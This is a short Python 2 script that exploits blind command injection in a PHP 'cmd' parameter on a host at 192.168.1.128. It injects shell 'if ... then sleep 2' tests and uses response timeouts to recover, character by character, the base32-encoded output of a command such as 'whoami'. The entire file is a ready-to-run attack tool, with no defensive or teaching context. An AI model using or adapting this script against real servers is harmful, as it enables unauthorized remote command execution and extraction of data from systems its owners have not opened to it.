#coding:utf-8
import requests
import sys
import base64
'''
http://192.168.1.128/index.php?cmd=if [ $(whoami|base32|cut -c 1) = O ];then sleep 2;fi
'''

payloads = "QWERTYUIIOPASDFGHJKLZXCVBNM1234567890="

def request(url, timeout):
    try:
        res = requests.get(url, timeout = timeout)
    except:
        return True

def get_length(url, cmd, timeout):
    length = ''
    for i in xrange(1,10):
        url1 = url+'if [ $(%s|base32|wc -c|cut -c %s) =  ];then sleep 2;fi' % (cmd, i)
        # print url1
        if request(url1, timeout):
            llength = i
            break
    for i in xrange(1, llength):
        for _ in xrange(1, 10):
            url1 = url+'if [ $(%s|base32|wc -c|cut -c %s) = %s ];then sleep 2;fi' % (cmd, i, _)
            # print url1
            if request(url1, timeout):
                length += str(_)
                print length
                break
    return length

def get_content(url, cmd, timeout, length):
    content = ''
    for i in xrange(1, int(length)+1):
        for payload in payloads:
            url1 = url+'if [ $(%s|base32|cut -c %s) = %s ];then sleep 2;fi' % (cmd, i, payload)
            if request(url1, timeout):
                content += payload
                print content
                break
    return content

if __name__ == '__main__':
    length = get_length('http://192.168.1.128/index.php?cmd=','whoami', 2.0)
    print "## The base32 of content's length is:%s" % length
    content = get_content('http://192.168.1.128/index.php?cmd=', 'whoami', 2.0, length)
    print "## The base32 of content is:%s" % content
    print "## The commend result content is:%s" % base64.b32decode(content).strip()
